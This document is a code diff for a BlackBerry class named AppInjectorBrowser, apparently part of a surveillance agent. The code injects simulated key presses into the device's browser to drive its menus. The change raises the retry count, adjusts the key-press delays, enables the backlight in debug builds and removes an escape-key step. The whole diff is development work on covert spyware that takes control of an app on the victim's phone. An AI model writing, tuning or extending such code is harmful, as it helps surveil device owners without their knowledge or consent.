@@ -9,6 +9,7 @@
 
 package blackberry.agent.url;
 
+import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
@@ -31,10 +32,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
     private static final int DELAY = 15000;
-    private static final int MAX_TRIES = 4;
+    private static final int MAX_TRIES = 8;
 
     private int tries = 0;
-    private int delay = 200; //500;
+    private int delay = 300; //500;
     boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
@@ -88,34 +89,33 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
             return false;
         }
 
-        if (tries % 2 == 0) {
-          //#ifdef DEBUG
-            debug.trace("callMenuByKey press escape key, try: " + tries);
-            //#endif
-            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-            //KeyInjector.trackBallRawClick();
-        }
+        //#ifdef DEBUG
+        Backlight.enable(true);
+        //#endif
+        /*
+         * if (tries % 2 == 0) { //#ifdef DEBUG
+         * debug.trace("callMenuByKey press escape key, try: " + tries);
+         * //#endif KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+         * //KeyInjector.trackBallRawClick(); }
+         */
+
+        Utils.sleep(delay + tries * 20);
         
         //#ifdef DEBUG
         debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
-        if (true) {
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey: pressRawKey");
-            //#endif
-            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        } else {
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey: pressKey");
-            //#endif
-            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
-        }
+
+        //#ifdef DEBUG
+        debug.trace("callMenuByKey: pressRawKey");
+        //#endif
+        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+
         Utils.sleep(delay + tries * 20);
         //KeyInjector.trackBallRawClick();
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        
+
         if (screen != null) {
             screen.close();
         }
